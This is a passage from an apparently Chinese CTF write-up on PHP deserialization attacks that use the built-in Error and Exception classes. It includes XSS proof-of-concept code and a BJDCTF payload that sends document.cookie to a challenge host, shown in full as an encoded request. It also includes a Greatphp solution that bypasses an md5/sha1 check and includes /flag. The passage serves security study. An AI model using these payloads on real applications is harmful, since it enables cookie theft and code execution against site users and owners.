class="title class_">GlobIterator</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">SplFileObject</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">SplTempFileObject</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">SplFixedArray</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">ReflectionException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">ReflectionException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionFunctionAbstract</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionFunction</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionParameter</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionType</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionNamedType</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionMethod</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionClass</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionObject</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionProperty</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionClassConstant</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionExtension</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionZendExtension</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">AssertionError</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">AssertionError</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">DOMException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">DOMException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">PDOException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">PDOException</span>::<span class="variable constant_">__toString</span></span><br><span class="line">PDO::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">PDOStatement</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">SimpleXMLElement</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">SimpleXMLIterator</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">SoapClient</span>::<span class="variable constant_">__call</span></span><br><span class="line"><span class="title class_">SoapFault</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">SoapFault</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">CURLFile</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line">mysqli_sql_exception::<span class="variable constant_">__wakeup</span></span><br><span class="line">mysqli_sql_exception::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">PharException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">PharException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">Phar</span>::<span class="variable constant_">__destruct</span></span><br><span class="line"><span class="title class_">Phar</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">PharData</span>::<span class="variable constant_">__destruct</span></span><br><span class="line"><span class="title class_">PharData</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">PharFileInfo</span>::<span class="variable constant_">__destruct</span></span><br><span class="line"><span class="title class_">PharFileInfo</span>::<span class="variable constant_">__toString</span></span><br></pre></td></tr></table></figure>
<p>只需要注意一些常用的内置类</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Error</span></span><br><span class="line"><span class="built_in">Exception</span></span><br><span class="line">SoapClient</span><br><span class="line"><span class="built_in">DirectoryIterator</span></span><br><span class="line"><span class="built_in">FilesystemIterator</span></span><br><span class="line"><span class="built_in">SplFileObject</span></span><br><span class="line">SimpleXMLElement</span><br></pre></td></tr></table></figure>
<h4 id="利用errorexception-内置类进行-xss"><a class="markdownIt-Anchor" href="#利用errorexception-内置类进行-xss"></a> 利用Error/Exception 内置类进行 XSS</h4>
<h5 id="error内置类"><a class="markdownIt-Anchor" href="#error内置类"></a> Error内置类</h5>
<p>使用条件:</p>
<ul>
<li>适用于php7版本</li>
<li>在开启报错的情况下</li>
</ul>
<p>Error类是php的一个内置类，用于自动自定义一个Error，在php7的环境下可能会造成一个xss漏洞，因为它内置有一个 <code>__toString()</code> 的方法，常用于PHP 反序列化中。如果有个POP链走到一半就走不通了，可以尝试利用这个来做一个xss，直接利用xss来打。其实我看到的还是有好一些cms会选择直接使用 <code>echo &lt;Object&gt;</code> 的写法，当 PHP 对象被当作一个字符串输出或使用时候（如<code>echo</code>的时候）会触发<code>__toString</code> 方法，这也是挖洞的一种思路。</p>
<p>测试例子：</p>
<p>本地放一个error.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>这里可以看到是一个反序列化函数，但是没有让我们进行反序列化的类，这就遇到了一个反序列化但没有POP链的情况，所以只能找到PHP内置类来进行反序列化</p>
<p>poc:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>直接可以弹出xss，触发了xss漏洞</p>
<h4 id="exception内置类"><a class="markdownIt-Anchor" href="#exception内置类"></a> Exception内置类</h4>
<ul>
<li>适用于php5、7版本</li>
<li>开启报错的情况下</li>
</ul>
<p>原理是类似的</p>
<p>测试代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>poc</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="bjdctf-2ndxss之光"><a class="markdownIt-Anchor" href="#bjdctf-2ndxss之光"></a> [BJDCTF 2nd]xss之光</h5>
<p>首先进入题目中，我们找到git泄露拿到源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;yds_is_so_beautiful&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
<p>这就是一个典型的反序列化函数，但是没有给出反序列化的类，我们无法构造pop链，只有利用php内置类来反序列化，加上一个echo，我们就可以利用<code>Error</code>内置类来<code>XSS</code></p>
<p>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$poc</span> = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;&lt;script&gt;window.open(&#x27;http://de28dfb3-f224-48d4-b579-f1ea61189930.node3.buuoj.cn/?&#x27;+document.cookie);&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$poc</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>一般xss的题都是在cookie理里，所以我们利用XSS把cookie带出来</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/?yds_is_so_beautiful=O%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span><span class="built_in">Exception</span>%<span class="number">22</span>%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>message%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A109%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">3</span>Cscript%<span class="number">3</span>Ewindow.open%<span class="number">28</span>%<span class="number">27</span>http%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>Fde28dfb3-f224-<span class="number">48</span>d4-b579-f1ea61189930.node3.buuoj.cn%<span class="number">2</span>F%<span class="number">3</span>F%<span class="number">27</span>%<span class="number">2</span>Bdocument.cookie%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">3</span>C%<span class="number">2</span>Fscript%<span class="number">3</span>E%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A17%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span><span class="built_in">Exception</span>%<span class="number">00</span><span class="keyword">string</span>%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A0%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>code%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A0%<span class="number">3</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>file%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A18%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">2</span>Fusercode%<span class="number">2</span>Ffile.php%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>line%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A2%<span class="number">3</span>Bs%<span class="number">3</span>A16%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span><span class="built_in">Exception</span>%<span class="number">00</span>trace%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A0%<span class="number">3</span>A%<span class="number">7</span>B%<span class="number">7</span>Ds%<span class="number">3</span>A19%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span><span class="built_in">Exception</span>%<span class="number">00</span>previous%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure>
<p>然后flag就在cookie中</p>
<h4 id="使用-errorexception-内置类绕过哈希比较"><a class="markdownIt-Anchor" href="#使用-errorexception-内置类绕过哈希比较"></a> 使用 Error/Exception 内置类绕过哈希比较</h4>
<p>Error和Exception这两个PHP内置类，但对他们不限于 XSS，还可以通过巧妙的构造绕过md5()函数和sha1()函数的比较。</p>
<h5 id="error类"><a class="markdownIt-Anchor" href="#error类"></a> Error类</h5>
<p>条件：php7.0.0</p>
<p>类介绍</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Error</span> <span class="keyword">implements</span> <span class="built_in">Throwable</span> &#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">	<span class="comment">/* 属性 */</span></span><br><span class="line">	<span class="keyword">protected</span> <span class="keyword">string</span> <span class="variable">$message</span> ;</span><br><span class="line">	<span class="keyword">protected</span> <span class="keyword">int</span> <span class="variable">$code</span> ;</span><br><span class="line">	<span class="keyword">protected</span> <span class="keyword">string</span> <span class="variable">$file</span> ;</span><br><span class="line">	<span class="keyword">protected</span> <span class="keyword">int</span> <span class="variable">$line</span> ;</span><br><span class="line">	<span class="comment">/* 方法 */</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__construct</span> ( <span class="keyword">string</span> <span class="variable">$message</span> = <span class="string">&quot;&quot;</span> , <span class="keyword">int</span> <span class="variable">$code</span> = <span class="number">0</span> , <span class="built_in">Throwable</span> <span class="variable">$previous</span> = <span class="literal">null</span> )</span><br><span class="line">	<span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getMessage</span> ( ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getPrevious</span> ( ) : <span class="built_in">Throwable</span></span><br><span class="line">	<span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getCode</span> ( ) : <span class="keyword">mixed</span></span><br><span class="line">	<span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getFile</span> ( ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getLine</span> ( ) : <span class="keyword">int</span></span><br><span class="line">	<span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getTrace</span> ( ) : <span class="keyword">array</span></span><br><span class="line">	<span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getTraceAsString</span> ( ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__toString</span> ( ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">final</span> <span class="keyword">private</span> <span class="title function_ invoke__">__clone</span> ( ) : <span class="keyword">void</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>类属性：</strong></p>
<ul>
<li>message：错误消息内容</li>
<li>code：错误代码</li>
<li>file：抛出错误的文件名</li>
<li>line：抛出错误在该文件中的行数</li>
</ul>
<p><strong>类方法：</strong></p>
<ul>
<li><a href="https://www.php.net/manual/zh/error.construct.php"><code>Error::__construct</code></a> — 初始化 error 对象</li>
<li><a href="https://www.php.net/manual/zh/error.getmessage.php"><code>Error::getMessage</code></a> — 获取错误信息</li>
<li><a href="https://www.php.net/manual/zh/error.getprevious.php"><code>Error::getPrevious</code></a> — 返回先前的 Throwable</li>
<li><a href="https://www.php.net/manual/zh/error.getcode.php"><code>Error::getCode</code></a> — 获取错误代码</li>
<li><a href="https://www.php.net/manual/zh/error.getfile.php"><code>Error::getFile</code></a> — 获取错误发生时的文件</li>
<li><a href="https://www.php.net/manual/zh/error.getline.php"><code>Error::getLine</code></a> — 获取错误发生时的行号</li>
<li><a href="https://www.php.net/manual/zh/error.gettrace.php"><code>Error::getTrace</code></a> — 获取调用栈（stack trace）</li>
<li><a href="https://www.php.net/manual/zh/error.gettraceasstring.php"><code>Error::getTraceAsString</code></a> — 获取字符串形式的调用栈（stack trace）</li>
<li><a href="https://www.php.net/manual/zh/error.tostring.php"><code>Error::__toString</code></a> — error 的字符串表达</li>
<li><a href="https://www.php.net/manual/zh/error.clone.php"><code>Error::__clone</code></a> — 克隆 error</li>
</ul>
<h5 id="exception-类"><a class="markdownIt-Anchor" href="#exception-类"></a> Exception 类</h5>
<p>条件：php5</p>
<p>类摘要</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Exception</span> &#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">	<span class="comment">/* 属性 */</span></span><br><span class="line">	<span class="keyword">protected</span> <span class="keyword">string</span> <span class="variable">$message</span> ;</span><br><span class="line">	<span class="keyword">protected</span> <span class="keyword">int</span> <span class="variable">$code</span> ;</span><br><span class="line">	<span class="keyword">protected</span> <span class="keyword">string</span> <span class="variable">$file</span> ;</span><br><span class="line">	<span class="keyword">protected</span> <span class="keyword">int</span> <span class="variable">$line</span> ;</span><br><span class="line">	<span class="comment">/* 方法 */</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__construct</span> ( <span class="keyword">string</span> <span class="variable">$message</span> = <span class="string">&quot;&quot;</span> , <span class="keyword">int</span> <span class="variable">$code</span> = <span class="number">0</span> , <span class="built_in">Throwable</span> <span class="variable">$previous</span> = <span class="literal">null</span> )</span><br><span class="line">	<span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getMessage</span> ( ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getPrevious</span> ( ) : <span class="built_in">Throwable</span></span><br><span class="line">	<span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getCode</span> ( ) : <span class="keyword">mixed</span></span><br><span class="line">	<span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getFile</span> ( ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getLine</span> ( ) : <span class="keyword">int</span></span><br><span class="line">	<span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getTrace</span> ( ) : <span class="keyword">array</span></span><br><span class="line">	<span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getTraceAsString</span> ( ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__toString</span> ( ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">final</span> <span class="keyword">private</span> <span class="title function_ invoke__">__clone</span> ( ) : <span class="keyword">void</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>类属性：</strong></p>
<ul>
<li>message：异常消息内容</li>
<li>code：异常代码</li>
<li>file：抛出异常的文件名</li>
<li>line：抛出异常在该文件中的行号</li>
</ul>
<p><strong>类方法：</strong></p>
<ul>
<li><a href="https://www.php.net/manual/zh/exception.construct.php"><code>Exception::__construct</code></a> — 异常构造函数</li>
<li><a href="https://www.php.net/manual/zh/exception.getmessage.php"><code>Exception::getMessage</code></a> — 获取异常消息内容</li>
<li><a href="https://www.php.net/manual/zh/exception.getprevious.php"><code>Exception::getPrevious</code></a> — 返回异常链中的前一个异常</li>
<li><a href="https://www.php.net/manual/zh/exception.getcode.php"><code>Exception::getCode</code></a> — 获取异常代码</li>
<li><a href="https://www.php.net/manual/zh/exception.getfile.php"><code>Exception::getFile</code></a> — 创建异常时的程序文件名称</li>
<li><a href="https://www.php.net/manual/zh/exception.getline.php"><code>Exception::getLine</code></a> — 获取创建的异常所在文件中的行号</li>
<li><a href="https://www.php.net/manual/zh/exception.gettrace.php"><code>Exception::getTrace</code></a> — 获取异常追踪信息</li>
<li><a href="https://www.php.net/manual/zh/exception.gettraceasstring.php"><code>Exception::getTraceAsString</code></a> — 获取字符串类型的异常追踪信息</li>
<li><a href="https://www.php.net/manual/zh/exception.tostring.php"><code>Exception::__toString</code></a> — 将异常对象转换为字符串</li>
<li><a href="https://www.php.net/manual/zh/exception.clone.php"><code>Exception::__clone</code></a> — 异常克隆</li>
</ul>
<p>在Error和Exception这两个PHP原生类中内只有 <code>__toString</code> 方法，这个方法用于将异常或错误对象转换为字符串。</p>
<p>看看触发Error的__toString方法</p>
<p>测试代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line">输出</span><br><span class="line"><span class="built_in">Error</span>: payload in /usercode/file.php:<span class="number">2</span></span><br><span class="line">Stack trace:</span><br><span class="line"><span class="comment">#0 &#123;main&#125;</span></span><br></pre></td></tr></table></figure>
<p>发现这将会以字符串的形式输出当前报错，包含当前的错误信息（”payload”）以及当前报错的行号（”2”），而传入 <code>Error(&quot;payload&quot;,1)</code> 中的错误代码“1”则没有输出出来。</p>
<p>下一个例子：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">1</span>);<span class="variable">$b</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\r\n\r\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br></pre></td></tr></table></figure>
<p>输出</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Error</span>: payload in /usercode/file.php:<span class="number">2</span></span><br><span class="line">Stack trace:</span><br><span class="line"><span class="comment">#0 &#123;main&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Error</span>: payload in /usercode/file.php:<span class="number">2</span></span><br><span class="line">Stack trace:</span><br><span class="line"><span class="comment">#0 &#123;main&#125;</span></span><br></pre></td></tr></table></figure>
<p><code>$a</code> 和 <code>$b</code> 这两个错误对象本身是不同的，但是 <code>__toString</code> 方法返回的结果是相同的</p>
<p>利用Error和Exception类的这一点可以绕过在PHP类中的哈希比较</p>
<h5 id="2020-极客大挑战greatphp"><a class="markdownIt-Anchor" href="#2020-极客大挑战greatphp"></a> [2020 极客大挑战]Greatphp</h5>
<p>还是一样的，给出源码，就代码审计</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYCLOVER</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$syc</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;syc != <span class="variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;syc) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;syc)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;lover)) )&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">           <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="variable">$this</span>-&gt;syc, <span class="variable">$match</span>))&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">               <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;syc);</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">               <span class="keyword">die</span>(<span class="string">&quot;Try Hard !!&quot;</span>);</span><br><span class="line">           &#125;</span><br><span class="line">           </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;great&#x27;</span>]))&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;great&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;syc != <span class="variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;syc) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;syc)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;lover)) )</span><br></pre></td></tr></table></figure>
<p>对于这个，我们常见的是利用数组绕过强类型，但是这个是在类中，不能使用数组，只有使用Error类。</p>
<p>md5()和sha1()可以对一个类进行hash，并且会触发这个类的 <code>__toString</code> 方法；且当eval()函数传入一个类对象时，也会触发这个类里的 <code>__toString</code> 方法，刚才实验过，Error类中的<code>__toString</code>将类转换的字符串相等。</p>
<p>又存在preg_match，过滤了括号，无法调用函数，尝试<code>include &quot;/flag&quot;</code>,但是引号过滤了，我们可以使用<code>两次取反，自动获得字符串</code>的。(绕过引号，长知识了)</p>
<p>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYCLOVER</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$syc</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">		<span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;syc != <span class="variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;syc) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;syc)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;lover)) )&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">		   <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="variable">$this</span>-&gt;syc, <span class="variable">$match</span>))&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">			   <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;syc);</span><br><span class="line">		   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">			   <span class="keyword">die</span>(<span class="string">&quot;Try Hard !!&quot;</span>);</span><br><span class="line">		   &#125;</span><br><span class="line">		   </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cmd</span>=<span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line"><span class="variable">$cmd</span>=<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$cmd</span>)</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;?&gt;&lt;?=include~&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%D0%99%93%9E%98&quot;</span>).<span class="string">&quot;?&gt;&quot;</span>;</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">也可以用，也需要用两次取反</span></span><br><span class="line"><span class="comment">$str1 = &quot;?&gt;&lt;?=include[~&quot;.urldecode(&quot;%D0%99%93%9E%98&quot;).&quot;][!&quot;.urldecode(&quot;%FF&quot;).&quot;]?&gt;&quot;;</span></span><br><span class="line"><span class="comment">$str = &quot;?&gt;&lt;?=include $_GET[1]?&gt;&quot;; </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$str</span>,<span class="number">1</span>);<span class="variable">$b</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$str</span>,<span class="number">2</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">SYCLOVER</span>();</span><br><span class="line"><span class="variable">$c</span>-&gt;syc = <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;lover = <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>)));</span><br><span class="line"></span><br><span class="line"><span 